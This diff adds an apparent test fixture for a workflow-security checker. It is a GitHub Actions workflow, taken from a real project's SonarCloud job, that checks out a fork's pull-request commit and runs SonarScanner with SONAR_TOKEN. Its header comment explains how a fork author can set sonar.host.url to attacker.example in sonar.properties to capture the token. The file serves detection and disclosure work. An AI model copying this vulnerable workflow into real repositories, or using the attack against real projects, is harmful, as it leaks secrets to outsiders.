@@ -1,0 +1,45 @@
+# situation: on workflow_run, a job checks out the head commit of the run that
+#   triggered the workflow, from the head repository of the run (the fork of a
+#   pull request), and runs SonarScanner with the secret SONAR_TOKEN and
+#   -Dproject.settings=sonar.properties. These are the steps of sonarcloud.yml
+#   of kptdev/kpt (commit 6345d96d661eae1f6cdcb97b1f70080ce35f61a4, lines
+#   90-147).
+# reason: SonarScanner reads sonar.properties of the commit that the job
+#   checked out, and the author of the fork writes sonar.host.url in that
+#   file, so the scanner sends SONAR_TOKEN to a host of the author.
+#   request-forgery does not report it (the undetected form workspace-config).
+# attack: the author of the pull request of a fork writes
+#   sonar.host.url=https://attacker.example in sonar.properties of the head
+#   commit.
+# attack-run-behavior: the scanner reads sonar.properties of the checkout and
+#   sends SONAR_TOKEN to https://attacker.example.
+# advisory: https://securitylab.github.com/advisories/GHSL-2026-208_kptdev_kpt_repository/
+on:
+  workflow_run:
+    workflows: [Go]
+    types: [completed]
+jobs:
+  sonarqube:
+    runs-on: ubuntu-latest
+    permissions:
+      actions: read
+      contents: read
+      pull-requests: read
+    steps:
+      - name: Checkout PR head
+        uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7.0.0
+        with:
+          repository: ${{ github.event.workflow_run.head_repository.full_name }}
+          ref: ${{ github.event.workflow_run.head_sha }}
+          fetch-depth: 0
+          persist-credentials: false
+          allow-unsafe-pr-checkout: true
+      - name: SonarQube Scan on PR
+        uses: SonarSource/sonarqube-scan-action@713881670b6b3676cda39549040e2d88c70d582e # v8.2.0
+        env:
+          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
+        with:
+          args: >
+            -Dsonar.projectKey=kptdev_kpt
+            -Dsonar.organization=kptdev
+            -Dproject.settings=sonar.properties
